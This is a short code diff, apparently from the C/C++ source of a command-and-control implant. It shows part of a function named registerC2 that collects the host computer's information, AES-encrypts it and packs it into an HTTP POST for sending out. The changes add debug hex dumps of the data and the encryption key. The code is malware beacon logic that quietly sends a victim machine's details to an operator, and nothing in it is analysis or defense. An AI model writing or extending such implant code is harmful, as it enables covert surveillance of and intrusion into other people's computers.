@@ -278,11 +278,19 @@ void registerC2() {
 
 
     // Step.5 提交宿主机信息
-    TOTAL_PRINTF("Step.5 Post info of the computer.\n");
+    TOTAL_PRINTF("\nStep.5 Post info of the computer.\n");
     char buf2[1024];
-    len = strlen(info);
-    memmove(buf2, info, len);
+    for(len = 0; info[len] != '\x00'; len++) {
+        buf2[len] = info[len];
+    }
+    len++;
+    hexDump((PBYTE)buf2, len);
     globalAES->EncryptData((PBYTE)buf2, &len);
+    printf("\nencrypt data = \n");
+    hexDump((PBYTE)buf2, len);
+    printf("\nAES key = \n");
+    hexDump(globalAES->g_Key, 176);
+
     int httpLen = sprintf(buf, httpPostHead, len, temp) - 1;
     for(i = 0; i < len; i++) {
         buf[httpLen + i] = buf2[i];
